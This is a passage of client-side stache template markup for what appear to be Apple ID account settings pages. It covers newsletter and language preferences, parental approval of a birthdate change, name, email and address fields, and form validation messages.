                        <h2 class="wrap-popover-title">
                            Newsletters
                        </h2>
                    </div>
                {{/editMode}}
                <div class="section-action">
                    <button class="btn btn-link section-title" aria-controls="newsletters-content">
                        Newsletters
                    </button>
                </div>
            </div>
            <div class="col-md-9 subsection" id="newsletters-content" aria-labelledby="heading-newsletters">
                <div class="row">
                    <div class="col-sm-6">
                        <h3 class="section-subtitle language-subtitle">LANGUAGE</h3>
                        <div class="form-group clearfix">
                            <div class="select-wrapper">
                                <label class="sr-only" for="lang">Choose country</label>
                                <select id="lang" type="text" can-value="account.preferences.preferredLanguage"
                                        class="form-control select-country">
                                    {{#each config.localizedResources.languageOptions}}
                                        <option value="{{code}}">{{name}}</option>
                                    {{/each}}
                                </select>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="row checkbox-row">
                    <div class="col-sm-12">
                        <h3 class="section-subtitle">EMAIL FROM APPLE</h3>
                        {{#unless config.pageFeatures.hideNewsletter}}
                            <div class="checkbox">
                                <input type="checkbox" id="news" name="news" checked="checked" can-value='account.preferences.marketingPreferences.appleUpdates' />
                                <label for="news">
                                    Announcements <small class="label-small">Get announcements, recommendations and updates about Apple products, services, software updates and more.</small>
                                </label>
                            </div>

                            <div class="checkbox">
                                <input type="checkbox" id="itunes" name="itunes" checked can-value='account.preferences.marketingPreferences.iTunesUpdates' />
                                <label for="itunes">
                                    Apple Music, iTunes, iBooks, and App Store Offers <small class="label-small">Get recommendations, the latest releases, special offers and exclusive content for music, apps, movies, TV, books, podcasts and more.</small>
                                </label>
                            </div>
                            {{#if config.localizedResources.showAppleNewsOption}}
                                <div class="checkbox">
                                    <input type="checkbox" id="appleNews" name="appleNews" checked can-value='account.preferences.marketingPreferences.appleNews' />
                                    <label for="appleNews">
                                        Apple News Updates <small class="label-small">Get the best stories and recommendations from Apple News delivered directly to your inbox.</small>
                                    </label>
                                </div>
                            {{/if}}
                        {{/unless}}
                    </div>
                </div>
            </div>
        {{else}}
            <div class="col-md-3 section-name">
                <h2 class="not-mobile section-title break-section-title">
                    Language
                </h2>
                {{#editMode}}
                    <div class="mobile-only section-title">
                        <button class="btn btn-link btn-overlay btn-back"> Back </button>
                        <h2 class="wrap-popover-title">
                            Language
                        </h2>
                    </div>
                {{/editMode}}
                <div class="section-action">
                    <button class="btn btn-link section-title" aria-controls="newsletters-content">
                        Language
                    </button>
                </div>
            </div>
            <div class="col-md-9 subsection">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-5">
                        <div class="form-group clearfix">
                            <div class="select-wrapper">
                                <label class="sr-only" for="countryOptions">Choose country</label>
                                <select id="lang" type="text" can-value="account.preferences.preferredLanguage"
                                        class="form-control">
                                    {{#each config.localizedResources.languageOptions}}
                                        <option value="{{code}}">{{name}}</option>
                                    {{/each}}
                                </select>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        {{/unless}}
    </div>
</section>

</script>
<script type="text/stache" id="jstache_793675262">


<section id="support" class="flow-section support">
    <div class="row">
        <div class="col-md-6 section-name">
            <button class="btn btn-link support-pin">
                <span class="icon icon_handset_circle"></span><span class="btn-txt" >Support PIN</span>
            </button>
        </div>
    </div>
</section>

</script>
<script type="text/stache" id="jstache_1970413609">


<div class="container approve-underage-DOB">
    {{#if config.changeBirthdayRequest.parentalConsentContent}}
    <section id="approveUnderageDOB">
        <header>
            <h4>Update {{requestor.firstName}}s date of birth?</h4>
            <p>As a family organiser you can approve date of birth change requests from child family members and convert adult family member accounts into child accounts. <a href="http://support.apple.com/HT201084" target="_blank">Learn more ></a></p>
            <p>This change will be permanent once approved. {{requestor.firstName}}s account will remain part of your family until {{requestor.firstName}} turns {{requestor.underageLimit}} years old.</p>
            <div class="form-group birthday-wrapper">
                <label for="date" class="sr-only">Date of birth</label>
                <date focus-placeholder="{{config.localizedResources.dateInputPlaceholder}}" format="{{config.localizedResources.dateInputFormat}}"
                      classes="form-control form-input {{#if errors.birthday.hasErrors}}has-errors{{/if}}" placeholder="birthday" input-date="{requestedBirthday}"
                      errors="{errors.birthday}"></date>

                {{#if errors.birthday.hasErrors}}
                   <div class="errorPop-body popover bottom fade in" role="group">
                       <div id="arrow" class="errorPop-arrow arrow"></div>
                       <div class="errorPop-content popover-content">
                           {{#if errors.birthday.invalid}}
                           <span class="show">Enter a complete date of birth with a day, month and a year.</span>
                           {{else}}
                                {{errors.birthday.main.message}}
                           {{/if}}
                       </div>
                   </div>
               {{/if}}
            </div>
        </header>
        <div>
            <h4>Parent Privacy Disclosure</h4>
            <div class="dob-approve-disclosure">
                {{{parentalConsent.content}}}
            </div>
        </div>

        <div class="security-code-validation">
            {{#if isCVVVerficationType}}
                <span>To agree, please enter the security code for {{paymentMethod.paymentMethodName}}:</span>
                <div class="form-group cvv-input cvv-wrapper">
                    <label class="sr-only" for="cvv">CVV</label>
                    <div class="pop-wrapper pop-inline question-mark-wrapper">
                        <button id="cvv_about" class="btn btn-link btn-icon list-action cvv-about">
                            <i class="icon icon_help"></i>
                            <span class="sr-only">More Info</span>
                        </button>
                        {{#flow}}
                        <div class="popover pop-flow pop-creditcards" role="tooltip" tabindex="-1" style="display: none;">
                            <div id="arrow" class="pop-arrow arrow"></div>
                            <div class="pop-content popover-content">
                                <div class="popover-body">
                                    <div id="cvv_popover">
                                        <div class="cvv-title">
                                            Where to find your Security Code:
                                        </div>
                                        <div class="cvv-visa">
                                            {{#if isUnionPaySupported}}
                                            UnionPay / Visa / MasterCard / Discover:
                                            {{else}}
                                            Visa / Mastercard / Discover:
                                            {{/if}}
                                            <img src="https://appleid.cdn-apple.com/static/bin/cb557578914/dist/assets/images/cvv_visa_mc.png" class="credit-card" />
                                        </div>
                                        <div class="cvv-amex">
                                            <div class="cvv-sub-title">American Express:</div>
                                            <img src="https://appleid.cdn-apple.com/static/bin/cb2499579377/dist/assets/images/cvv_amex.png" class="credit-card" />
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        {{/flow}}
                    </div>
                    <input class="form-control {{#if errors.cvv.hasErrors}}has-errors{{/if}}" type="text" id="cvv" name="cvv"
                        placeholder="security code" can-field="{cvv}" maxlength="4" />

                    {{#if errors.cvv.hasErrors}}
                       <div class="errorPop-body popover bottom fade in" role="tooltip">
                           <div id="arrow" class="errorPop-arrow arrow"></div>
                           <div class="errorPop-content popover-content">
                               {{errors.cvv.main.message}}
                           </div>
                       </div>
                    {{/if}}
                </div>
            {{else}}
                <span>To agree, please enter the verification code sent to {{obfuscatedPhoneNumber}}:</span>
                <div class="form-group cupcard-cvv-input">
                    <label class="sr-only" for="smsCode">Verification Code</label>
                    <input class="form-control {{#if errors.smsCode.hasErrors}}has-errors{{/if}}" type="text" id="smsCode" name="smsCode"
                        placeholder="verification code" can-field="{smsCode}" maxlength="{{{smsCodeLength}}}" />

                    {{#if errors.smsCode.hasErrors}}
                       <div class="errorPop-body popover bottom fade in" role="tooltip">
                           <div id="arrow" class="errorPop-arrow arrow"></div>
                           <div class="errorPop-content popover-content">
                               {{errors.smsCode.main.message}}
                           </div>
                       </div>
                    {{/if}}
                </div>
                <button type="button" class="btn btn-link resend new-code">
                    {{^if resendLoading}}
                        <i class="icon icon_reload"></i> Send a new code
                    {{else}}
                        <loading loading="{resendLoading}"></loading> Sending Code
                    {{/if}}
                </button>
            {{/if}}
        </div>

        <div class="nav-wrap">
            <div class="dob-nav">
                <div class="desktop">
                    <div class="text-center">
                        <div class="btn-group flow-controls" role="group" aria-label="Navigation buttons">
                            <button type="button" class="left-nav no-decoration nav-btn disagree btn btn-link" role="button">Disagree</button>
                            <button type="button" class="right-nav no-decoration nav-btn agree btn btn-link disabled" disabled role="button">Agree</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal fade flow-dialog default-dialog agree-disagree-modal" id="agreeDisagreeModal" role="dialog" aria-labelledby="" aria-hidden="true" data-backdrop="static">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-body">
                        {{#isApprovalComplete}}
                        <div class="modal-header">
                            <h4 class="modal-title">{{requestor.firstName}}s age has been updated.</h4>
                        </div>
                        <div class="modal-body-content">
                            <div class="body-text">An email will be sent to notify {{requestor.firstName}} that you approved this update.</div>
                        </div>
                        {{/isApprovalComplete}}
                        {{#isApprovalRejected}}
                        <div class="modal-header">
                            <h4 class="modal-title">{{requestor.firstName}}s age has not been updated.</h4>
                        </div>
                        <div class="modal-body-content">
                            <div class="body-text">
                                You have not approved {{requestor.firstName}}s age update.
                            </div>
                        </div>
                        {{/isApprovalRejected}}
                    </div>
                    <div class="modal-footer">
                        <div class="btn-group flow-controls pull-right">
                            <button class="btn btn-link first sign-out" data-dismiss="modal">Sign Out</button>
                            <button class="btn btn-link last goto-account">Go to your Account
                                <i id="challengeLoading" class="loading"></i>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    {{/else}}
    <div name="modalContainer" style="height:300px;">
        {{#reqerror}}
        <div class="modal fade flow-dialog default-dialog request-error-modal" id="requestErrorModal" role="dialog" aria-labelledby="" aria-hidden="true" data-backdrop="static">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-body">
                        <div class="row">
                            <div class="col-sm-2 not-mobile">
                                
                                <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Alert icon" width="60" class="alert-icon" />
                            </div>
                            <div class="col-sm-10">
                                <div class="modal-header">
                                    <h4 class="modal-title">{{{reqerror.title}}}</h4>
                                </div>
                                <div class="modal-body-content">
                                    <div class="row">
                                        <div class="col-sm-12 body-text">{{{reqerror.body}}}</div>
                                    </div>
                                </div>
                            </div>
                        </div>

                    </div>
                    <div class="modal-footer">
                        <div class="btn-group flow-controls pull-right">
                            <loading loading="{loading.account}"></loading>
                            <button type="button" class="btn btn-link first sign-out">Sign Out</button>
                            <button type="button" class="btn btn-link last goto-account">Go to your Account</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        {{/reqerror}}
    </div>
    {{/if}}
</div>

</script>
<script type="text/stache" id="jstache_1762873625">


<div class="loading">
  <i class="icon {{#loading}} icon_process rotate{{/loading}}{{#success}} icon_checkmark success{{/success}}{{#fail}} icon_alert fail{{/fail}} spinner"></i>
</div>
</script>
<script type="text/stache" id="jstache_79599564">


<h3 class="section-subtitle no-outline" id="appleIDLabel" tabindex="-1">APPLE ID</h3>
<div class="apple-id" aria-labelledby="appleIDLabel" aria-describedby="appleIDDescription">
  <dl class="dl inline-dl pin-tip-wrapper clearfix">
    <dt class="dt info-dt">
      <string-ellipsis content-value="{account.name}">{{ account.name }}</string-ellipsis>
    </dt>
    <dd class="dd action-dd minigreen-check-icon">
        {{#success}}
              <i class="icon icon_green_check icon_check appleid-updated"></i>
              <span class="sr-only">Success</span>
        {{/success}}
    </dd>
  </dl>
</div>
{{#if canEditAppleID}}
    <div class="pop-wrapper">
        <button class="btn btn-link change-appleID" data-toggle="popover"> Edit Email Address...</button>
        {{#flow}}
            <div class="popover pop-flow pop-email pop-changeAppleID" role="group" tabindex="-1" style="display: none;">
                <div class="pop-arrow arrow"></div>
                <div class="mobile-only section-title">
                    <h2 class="wrap-popover-title">
                        Email
                    </h2>
                </div>
                <div class="pop-content popover-content">
                    <changeappleidflow account="{account}" config="{config}" flow="{flow}" success="{success}" step="{step}"></changeappleidflow>
                </div>
            </div>
        {{/flow}}
    </div>
{{else}}
    {{#if canSwitchAlias}}
        <div class="pop-wrapper">
            <button class="btn btn-link change-alias" data-toggle="popover"> Edit Email Address...</button>
            {{#showChangeAliasPopover}}
            <div class="popover pop-flow pop-email pop-change-alias" role="group" tabindex="-1" style="display: none;">
                <div class="pop-arrow arrow"></div>
                <div class="mobile-only section-title">
                    <h2 class="wrap-popover-title">Email</h2>
                </div>
                <div class="pop-content popover-content">
                    <change-appleid-alias account="{account}" config="{config}" flow="{showChangeAliasPopover}" success="{success}"></change-appleid-alias>
                </div>
            </div>
            {{/showChangeAliasPopover}}
        </div>
    {{/if}}
{{/if}}
</script>
<script type="text/stache" id="jstache_1820829696">


<h3 class="section-subtitle" id="primaryEmailLabel">PRIMARY EMAIL</h3>

<div class="primary-email" aria-labelledby="primaryEmailLabel" aria-describedby="primaryEmailDescription">
    <dl class="dl inline-dl account-detail primary-wrapper clearfix">
        <dt class="dt info-dt">
            <string-ellipsis content-value="{account.person.primaryEmailAddress.address}">
                {{account.person.primaryEmailAddress.address}}
            </string-ellipsis>
            {{#success}}
            <i class="icon icon_green_check icon_check change-primary-updated"></i>
            <span class="sr-only">Success</span>
            {{/if}}
        </dt>

        <dd class="dd action-dd">
            {{^account.person.primaryEmailAddress.vetted}}
                <verify-primary-email></verify-primary-email>
            {{/if}}
        </dd>
    </dl>

</div>
{{^endsWithAppleDomain account.person.primaryEmailAddress.address}}
    <div class="pop-wrapper change-primary-wrapper">
        <button class="btn btn-link change-primary-email" data-toggle="popover"> Edit Email Address...</button>
        {{#flow}}
            <div class="popover pop-flow pop-email pop-change-primary-email" role="group" tabindex="-1" style="display: none;">
                <div class="pop-arrow arrow"></div>
                <div class="mobile-only section-title">
                    <h2 class="wrap-popover-title">
                        Email
                    </h2>
                </div>
                <div class="pop-content popover-content">
                    <changePrimaryEmailFlow account="{account}" flow="{flow}" success="{success}" step="{step}"></changePrimaryEmailFlow>
                </div>
            </div>
        {{/flow}}
    </div>
{{/endsWithAppleDomain}}

</script>
<script type="text/stache" id="jstache_945759648">


<h3 class="section-subtitle" id="nameLabel">NAME</h3>
<div class="form-group">
    {{#if firstNameOrderFirst}}
    <div class="pop-wrapper field-pop-wrapper first-wrapper">
        <first-name-input errors="{errors.firstName}" value="{firstName}" placeholder="first name" fieldname="firstname"></first-name-input>
        {{#if errors.firstName.showErrors}}
            <div class="errorPop-body popover" role="tooltip">
                <div class="errorPop-arrow arrow"></div>
                <div class="errorPop-content popover-content">
                    {{#errors.firstName.map.name_invalid}}
                        Please enter a first name.
                    {{else}}
                        {{errors.firstName.main.message}}
                    {{/errors.firstName.map.name_invalid}}
                </div>
            </div>
        {{/if}}
    </div>
    {{else}}
    <div class="pop-wrapper field-pop-wrapper {{#if showPronounceNames}}last-with-pronounce-wrapper{{else}}first-wrapper{{/if}}">
        <last-name-input errors="{errors.lastName}" value="{lastName}" placeholder="last name" fieldname="lastname"></last-name-input>
        {{#if errors.lastName.showErrors}}
            <div class="errorPop-body popover" role="tooltip">
                <div class="errorPop-arrow arrow"></div>
                <div class="errorPop-content popover-content">
                    {{#errors.lastName.map.name_invalid}}
                        Please enter a last name.
                    {{else}}
                        {{errors.lastName.main.message}}
                    {{/errors.lastName.map.name_invalid}}
                </div>
            </div>
        {{/if}}
    </div>
    {{/if}}

    {{#config.nameFeatures.middleNameRequired}}
        <div class="pop-wrapper field-pop-wrapper middle-wrapper">
            <middle-name-input errors="{errors.middleName}" value="{middleName}" placeholder="middle name (optional)" fieldname="middlename" validate-on-blur="false"></middle-name-input>
            {{#if errors.middleName.showErrors}}
            <div class="errorPop-body popover" role="tooltip">
                <div class="errorPop-arrow arrow"></div>
                <div class="errorPop-content popover-content">
                    {{errors.middleName.main.message}}
                </div>
            </div>
            {{/if}}
        </div>
    {{/if}}


    {{#if firstNameOrderFirst}}
    <div class="pop-wrapper field-pop-wrapper {{#if showPronounceNames}}last-with-pronounce-wrapper{{else}}last-wrapper{{/if}}">
        <last-name-input errors="{errors.lastName}" value="{lastName}" placeholder="last name" fieldname="lastname"></last-name-input>
        {{#if errors.lastName.showErrors}}
            <div class="errorPop-body popover" role="tooltip">
                <div class="errorPop-arrow arrow"></div>
                <div class="errorPop-content popover-content">
                    {{#errors.lastName.map.name_invalid}}
                        Please enter a last name.
                    {{else}}
                        {{errors.lastName.main.message}}
                    {{/errors.lastName.map.name_invalid}}
                </div>
            </div>
        {{/if}}
    </div>
    {{else}}
    <div class="pop-wrapper field-pop-wrapper{{#if showPronounceNames}} last-with-pronounce-wrapper{{else}} last-wrapper{{/if}}">
        <first-name-input errors="{errors.firstName}" value="{firstName}" placeholder="first name" fieldname="firstname"></first-name-input>
        {{#if errors.firstName.showErrors}}
            <div class="errorPop-body popover" role="tooltip">
                <div class="errorPop-arrow arrow"></div>
                <div class="errorPop-content popover-content">
                    {{#errors.firstName.map.name_invalid}}
                        Please enter a first name.
                    {{else}}
                        {{errors.firstName.main.message}}
                    {{/errors.firstName.map.name_invalid}}
                </div>
            </div>
        {{/if}}
    </div>
    {{/if}}

    {{#if showPronounceNames}}
        {{#if firstNameOrderFirst}}
            <div class="pop-wrapper field-pop-wrapper first-wrapper">
                <first-name-pronounced errors="{errors.firstNamePronounce}" value="{firstNamePronounce}" placeholder="first name pronounce" fieldname="firstnamepronounce"></first-name-pronounced>
                {{#if errors.firstNamePronounce.showErrors}}
                    <div class="errorPop-body popover" role="tooltip">
                        <div class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{#errors.firstNamePronounce.map.name_invalid}}
                                Please specify a first name pronunciation.
                            {{else}}
                                {{errors.firstNamePronounce.main.message}}
                            {{/errors.firstNamePronounce.map.name_invalid}}
                        </div>
                    </div>
                {{/if}}
            </div>
            <div class="pop-wrapper field-pop-wrapper last-wrapper">
                <last-name-pronounced errors="{errors.lastNamePronounce}" value="{lastNamePronounce}" placeholder="last name pronounce" fieldname="lastnamepronounce"></last-name-pronounced>
                {{#if errors.lastNamePronounce.showErrors}}
                    <div class="errorPop-body popover" role="tooltip">
                        <div class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{#errors.lastNamePronounce.map.name_invalid}}
                                Please specify a last name pronunciation.
                            {{else}}
                                {{errors.lastNamePronounce.main.message}}
                            {{/errors.lastNamePronounce.map.name_invalid}}
                        </div>
                    </div>
                {{/if}}
            </div>
        {{else}}
            <div class="pop-wrapper field-pop-wrapper first-wrapper">
                <last-name-pronounced errors="{errors.lastNamePronounce}" value="{lastNamePronounce}" placeholder="last name pronounce" fieldname="lastnamepronounce"></last-name-pronounced>
                {{#if errors.lastNamePronounce.showErrors}}
                    <div class="errorPop-body popover" role="tooltip">
                        <div class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{#errors.lastNamePronounce.map.name_invalid}}
                                Please specify a last name pronunciation.
                            {{else}}
                                {{errors.lastNamePronounce.main.message}}
                            {{/errors.lastNamePronounce.map.name_invalid}}
                        </div>
                    </div>
                {{/if}}
            </div>
            <div class="pop-wrapper field-pop-wrapper last-wrapper">
                <first-name-pronounced errors="{errors.firstNamePronounce}" value="{firstNamePronounce}" placeholder="first name pronounce" fieldname="firstnamepronounce"></first-name-pronounced>
                {{#if errors.firstNamePronounce.showErrors}}
                    <div class="errorPop-body popover" role="tooltip">
                        <div class="errorPop-arrow arrow"></div>
                        <div class="errorPop-content popover-content">
                            {{#errors.firstNamePronounce.map.name_invalid}}
                                Please specify a first name pronunciation.
                            {{else}}
                                {{errors.firstNamePronounce.main.message}}
                            {{/errors.firstNamePronounce.map.name_invalid}}
                        </div>
                    </div>
                {{/if}}
            </div>
        {{/if}}
    {{/if}}
</div>

</script>
<script type="text/stache" id="jstache_172826422">



    <div class="modal flow-dialog default-dialog dob-warning" id="dobWarningModal" role="dialog" aria-labelledby="birthdayApprovalTitle" tabindex="0" data-backdrop="static">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-body">
                    <div class="row">
                        <div class="col-sm-2 not-mobile">
                            
                            <img src="https://appleid.cdn-apple.com/static/bin/cb2442680439/dist/assets/images/alert_icon.png" alt="Alert icon" width="60" class="alert-icon" />
                        </div>
                        <div class="col-sm-10 exclude-padding">
                            <div class="modal-header" id="birthdayApprovalTitle">
                                <h4 class="modal-title">Parental consent is required to make this change.</h4>
                            </div>
                            <div class="modal-body-content">
                                <div class="row">
                                    <div class="col-sm-12 body-text">Changing your date of birth to {{formatDate dob.birthDate "LL" config false}} (age {{dob.ageInYears}}) will convert this Apple ID to a <a href="http://support.apple.com/HT201084" target="_blank">child account</a>.</div>
                                </div>
                                <div class="row">
                                    <div class="col-sm-12 body-text">An email request will be sent to your family organiser, {{dob.organizer.firstName}} {{dob.organizer.lastName}}, who can provide parental consent to make this change. Your account will remain part of {{dob.organizer.firstName}}s family until you are at least {{dobMinorAgeLimit}} years old.</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <div class="btn-group flow-controls pull-right">
                        <loading loading="{dobApprovalMap.birthdayLoading}"></loading>
                        <button type="button" class="btn btn-link first cancel-dob-request">Cancel</button>
                        <button type="button" class="btn btn-link last continue-dob-request">Continue</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

</script>
<script type="text/stache" id="jstache_929982080">


<section class="primary-address">
    <h3 class="section-subtitle">PRIMARY ADDRESS</h3>
    <idms-address {^is-address-dirty}="isAddressDirty"
                  {^address}="newPrimaryAddress"
                  {^@validate-address}="validatePrimaryAddress"
                  {^address-features}="newAddressFeatures"
                  {country-options}="countryOptions"
                  {default-country-code}="defaultCountryCode"
                  {localized-strings}="localizedStrings"
                  {initial-address-features}="addressFeatures"
                  {initial-address}="primaryAddress"
                  reset-on-country-change="true"
                  {(errors)}="errors">
    </idms-address>
</section>

</script>
<script type="text/stache" id="jstache_1843106911">


<div class="row form-group clearfix input-sizing no-left-right-margin-mobile">
    {{#if firstNameOrderFirst}}
    <div class="col-xs-6 firstName-wrap person-name">
        <label for="firstName" class="sr-only">
            first name
        </label>
        <input class="form-control {{#validator.errors.firstName.hasErrors}}has-errors{{/validator.errors.firstName.hasErrors}}" id="firstName" name=="firstName" type="text" placeholder="first name" can-value="firstname" aria-required="true" />
    </div>
    <div class="col-xs-6 lastName-wrap person-name">
        <label for="lastName" class="sr-only">
            last name
        </label>
        <input class="form-control {{#validator.errors.lastName.hasErrors}}has-errors{{/validator.errors.lastName.hasErrors}}" id="lastName" name="lastName" type="text" placeholder="last name" can-value="lastname" aria-required="true" />
    </div>
    {{/if}}
    {{#unless firstNameOrderFirst}}
        <div class="col-xs-6 lastName-wrap person-name swap-name-ordering">
            <label for="lastName" class="sr-only">
                last name
            </label>
            <input class="form-control {{#validator.errors.lastName.hasErrors}}has-errors{{/validator.errors.lastName.hasErrors}}" id="lastName" name="lastName" type="text" placeholder="last name" can-value="lastname" aria-required="true" />
        </div>
        <div class="col-xs-6 firstName-wrap person-name swap-name-ordering">
            <label for="firstName" class="sr-only">
                first name
            </label>
            <input class="form-control {{#validator.errors.firstName.hasErrors}}has-errors{{/validator.errors.firstName.hasErrors}}" id="firstName" name=="firstName" type="text" placeholder="first name" can-value="firstname" aria-required="true" />
        </div>
    {{/unless}}

</div>
</script>
<script type="text/stache" id="jstache_1098062150">


<span class="errorMsg {{#if errors.firstName.firstName_invalid}}show{{/if}}">Enter your first name.</span>
<span class="errorMsg {{#if errors.firstName.maxCharsLimit}}show{{/if}}">First name must be less than {{placeholder.firstNameMaxCharacters}} characters.</span>
<span class="errorMsg {{#if errors.firstName.blacklistedChar}}show{{/if}}">Your first name cannot include special characters.</span>
<span class="errorMsg {{#if errors.firstName.mustNotContainNumber}}show{{/if}}">Your first name cannot include a number.</span>
{{#each errorMessages.firstName}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_223115416">


<span class="errorMsg {{#if errors.lastName.lastName_invalid}}show{{/if}}">Enter your last name.</span>
<span class="errorMsg {{#if errors.lastName.maxCharsLimit}}show{{/if}}">Last name must be less than {{placeholder.lastNameMaxCharacters}} characters.</span>
<span class="errorMsg {{#if errors.lastName.blacklistedChar}}show{{/if}}">Your last name cannot include special characters.</span>
<span class="errorMsg {{#if errors.lastName.mustNotContainNumber}}show{{/if}}">Your last name cannot include a number.</span>
{{#each errorMessages.lastName}}
    <span class="errorMsg show">{{this}}</span>
{{/each}}
</script>
<script type="text/stache" id="jstache_681042744">


<input class="{{classes}} {{#if errors.hasErrors}} error has-errors{{/if}}{{^focused}}not-focused{{/focused}} date"
       id="date"
       type="{{type}}"
       placeholder="{{placeholder}}"
       errors="{errors}"
       can-field="{value}"
       autocorrect="off"
       autocapitalize="off"
       spellcheck="false"
       aria-invalid="{{ariaInvalid}}"
       aria-describedBy="{{ariaDescribedBy}}"/>
{{#str_eq type 'date'}}<label class="label-placeholder {{#if hidePlaceholder}}invisible{{/if}}">{{placeholder}}</label>{{/str_eq}}
</script>
<script type="text/stache" id="jstache_799430684">


<h3 class="section-subtitle"> CONTACTABLE AT</h3>
{{#if account.person.phoneNumbers}}
    <dl class="dl inline-dl account-detail account-phone-wrapper clearfix">
        {{#each account.person.phoneNumbers }}
            <dt class="dt info-dt">
                {{ fullNumberWithCountryPrefix }}  
            </dt>
            <dd class="dd action-dd">
                <div class="pop-wrapper pop-inline">
                  <a tabindex="0" class="btn btn-link btn-icon info-tip list-action phoneNumberIcon"
                          data-toggle="popover" data-html="true" data-placement="top" data-trigger="focus"
                          data-content="This is the number from your iPhone. It is used by iMessage and FaceTime. To remove this number, sign out of FaceTime and iMessage on your device.">
                      <i class="icon icon_help"></i>
                    <span class="sr-only">More Info</span>
                  </a>
                </div>
            </dd>
        {{/each}}
    </dl>
{{/if}}
{{#account.name}}
<dl class="dl inline-dl account-detail account-name-wrapper clearfix">
    <dt class="dt info-dt">
        <string-ellipsis content-value="{{account.name}}">{{ account.name }}</string-ellipsis>
    </dt>
    <dd class="dd action-dd">
        <div class="pop-wrapper pop-inline phone-msg">
            <a tabindex="0" id="primaryEmail" class="btn btn-link btn-icon info-tip list-action"
                data-container=".phone-msg" data-html="true" data-toggle="popover" data-placement="top" data-trigger="focus"
                data-content="This is your Apple ID email address.">
                    <i class="icon icon_help"></i>
                    <span class="sr-only">More Info</span>
             </a>
         </div>
    </dd>
</dl>
{{/account.name}}
{{#account.person.primaryEmailAddress.address}}
    <dl class="dl inline-dl account-detail primary-email-wrapper clearfix">
        {{^str_eq account.name . false}}
            <dt class="dt info-dt">
                <string-ellipsis content-value="{{.}}">{{.}}</string-ellipsis>
            </dt>
            <dd class="dd action-dd">
                <div class="pop-wrapper pop-inline primary-ea">
                    <a tabindex="0" id="primaryEmailAddress" class="btn btn-link btn-icon info-tip list-action primary-email-address"
                        data-container=".primary-ea" data-html="true" data-toggle="popover" data-placement="top" data-trigger="focus"
                        data-content="This is the primary email address for your account.">
                    <i class="icon icon_help"></i>
                    <span class="sr-only">More Info</span>
                    </a>
                </div>
            </dd>
        {{/str_eq}}
    </dl>
{{/if}}
{{#if account.aliases}}
    {{#each account.aliases }}
        {{^is this account.name}}
            <dl class="dl inline-dl account-detail aliases clearfix">
                <dt class="dt info-dt">
                    <string-ellipsis content-value="{{this}}">{{this}}</string-ellipsis>
                </dt>
                <dd class="dd action-dd">
                    <div class="pop-wrapper pop-inline account-alias" id="alias{{%index}}">
                        <a tabindex="0" class="btn btn-link btn-icon info-tip list-action"
                         data-container="#alias{{%index}}" data-html="true" data-toggle="popover" data-placement="top" data-trigger="focus"
                         data-content=" This is an alias of your Apple ID email address. ">
                            <i class="icon icon_help"></i>
                            <span class="sr-only">More Info</span>
                        </a>
                    </div>
                </dd>
            </dl>
        {{/is}}
    {{/each}}
{{/if}}
{{#if account.person.emails}}
        {{#each account.person.emails }}
            {{^is address account.name}}
              {{^str_eq address account.aliases}}
                <dl class="dl inline-dl account-detail clearfix">
                <dt class="dt info-dt">
                    <string-ellipsis content-value="{{address}}">{{ address }}</string-ellipsis>
                </dt>
                {{#if vetted}}
                    <dd class="dd action-dd">
                        <delete-reachable emailid="{id}" address="{address}" account="{account}" config="{config}" email-option="{emailOption}"></delete-reachable>
                    </dd>
                {{else}}
                    <dd class="dd action-dd unfinished">
                        <delete-reachable emailid="{id}" address="{address}" account="{account}" config="{config}" email-option="{emailOption}"></delete-reachable>
                        <verify-reachable emailid="{id}" address="{address}" account="{account}" config="{config}" email-option="{emailOption}"></verify-reachable>
                    </dd>
                {{/if}}
                </dl>
              {{/str_eq}}
            {{/is}}
        {{/each}}
{{/if}}

<div class="pop-wrapper">
    {{#emailOption}}
      <button class="btn btn-link add-reachable" data-toggle="popover">
        Add an Email Address...
      </button>
    {{/emailOption}}
    {{#flow}}
        <div id="pop-addReachable" class="popover pop-flow pop-addReachable" role="group" tabindex="-1" style="display: none;">
            <div class="pop-arrow arrow"></div>
            <div class="mobile-only section-title">
                <h2 class="wrap-popover-title">
                    Email
                </h2>
            </div>
            <div class="pop-content popover-content">
                <reachableflow account="{account}" config="{config}" flow="{flow}" step="{step}" email-option="{emailOption}"></reachableflow>
            </div>
        </div>
    {{/flow}}
</div>

</script>
<script type="text/stache" id="jstache_1487110908">


<div class="pop-wrapper{{#inline}} pop-inline{{/if}} pin-wrapper">
    {{#show}}
        <div class="popover pop-pin {{wrapClass}}">
            <div class="pop-arrow arrow"></div>
            <div class="pop-content popover-content">
                {{contentValue}}
            </div>
        </div>
    {{/show}}
    <div class="pin-tip force-ltr">
        {{ contentValue }}
    </div>
</div>
</script>
<script type="text/stache" id="jstache_1119987777">


<div class="accordion-fade {{wrapClass}}">
    <div class="accordion-fade acdn-edit">
        {{#edit}}
            <content></content>
        {{/edit}}
    </div>
    <div class="accordion-fade acdn-nonedit">
        {{^edit}}
            <content></content>
        {{/edit}}
    </div>
</div>
</script>
<script type="text/stache" id="jstache_2079593893">


<h3 class="section-subtitle" id="passwordLabel">PASSWORD</h3>
<div class="detail" aria-labelledby="passwordLabel" aria-describedby="passwordDescription">
    <div class="pop-wrapper">
        <button class="btn btn-link change-password"> Change Password... </button>
        {{#success}}<i class="icon icon_green_check icon_check password-saved"></i>{{/if}}
        {{#flow}}
            <div class="popover pop-flow pop-password" role="group" style="display: none;" tabindex="-1">
                <div id="arrow" class="pop-arrow arrow"></div>
                <div class="mobile-only section-title">
